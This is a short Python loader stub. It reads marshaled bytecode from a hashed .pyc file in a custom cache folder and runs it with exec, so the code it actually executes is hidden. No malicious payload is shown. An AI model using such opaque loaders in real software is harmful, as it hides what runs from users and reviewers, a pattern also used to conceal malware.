
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Usersays_c86c77c018874b5f9eb7d208a7c05686.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
